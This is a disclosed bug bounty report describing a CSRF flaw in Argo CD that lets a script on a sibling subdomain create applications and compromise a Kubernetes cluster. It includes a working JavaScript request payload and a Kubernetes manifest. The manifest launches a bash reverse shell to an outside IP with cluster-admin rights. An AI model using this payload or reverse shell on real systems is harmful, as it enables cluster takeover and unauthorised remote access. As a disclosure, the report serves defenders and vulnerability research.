# Argo CD CSRF leads to Kubernetes cluster compromise

## Report Details
- **Report ID**: 2326194
- **URL**: https://hackerone.com/reports/2326194
- **State**: Closed
- **Severity**: high
- **Submitted**: 2024-01-19T08:16:14.091Z
- **Disclosed**: 2024-01-29T18:03:05.777Z

## Reporter
- **Username**: tint0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
GHSA: https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg

It's been publicly known for years that all of Argo CD API is vulnerable to Cross-Site Request Forgery (CSRF). We assume the team haven't made it a priority because of the lack of evidence to support it's a severe vulnerability.

Modern browsers implement the Lax SameSite cookie attribute to prevent CSRF, but it is not foolproof. The samesite attribute is rendered useless if the origin is on the same parent domain as the target.

We spin up a sample environment with Argo CD v2.8.2 to test this. An attacker controls contents of ​​marketing.victim.com (via Stored XSS, for example) and wants to target argocd.internal.victim.com.

The following proof of concept allows the attacker to create a pod with admin privileges on the Kubernetes cluster via Argo CD. This piece of JavaScript is injected on the ​​marketing.victim.com homepage:
```
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://argocd.internal.victim.com/api/v1/applications');
xhr.setRequestHeader('Content-Type', 'text/plain')
xhr.withCredentials = true;
xhr.send('{"apiVersion":"argoproj.io/v1alpha1","kind":"Application","metadata":{"name":"test-app1"},"spec":{"destination":{"name":"","namespace":"default","server":"https://kubernetes.default.svc"},"source":{"path":"argotest1","repoURL":"https://github.com/califio/argotest1","targetRevision":"HEAD"},"sources":[],"project":"default","syncPolicy":{"automated":{"prune":false,"selfHeal":false}}}}')
```
Where repoURL points to a repository with the yaml definition like:
```
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-sa
---
apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  serviceAccountName: my-sa
  containers:
  - name: ubuntu
    image: ubuntu:latest
    command: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: my-role
rules:
- apiGroups: [""]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: my-rolebinding
subjects:
- kind: ServiceAccount
  name: my-sa
  namespace: default
roleRef:
  kind: ClusterRole
  name: my-role
  apiGroup: rbac.authorization.k8s.io
```
Then wait. An employee logged-in to argocd.internal.victim.com, when visiting marketing.victim.com, will lead to Kubernetes cluster compromise.

This is made possible because:
- Argo CD does not respect the Content-Type header. If it did, the request would have triggered a preflight CORS request on "application/json" CT and the attack fails.
- The attacker needs zero knowledge to craft a valid json. The cluster location, project name… are available by default.

## Impact

Kubernetes cluster compromise

## Attachments
No attachments
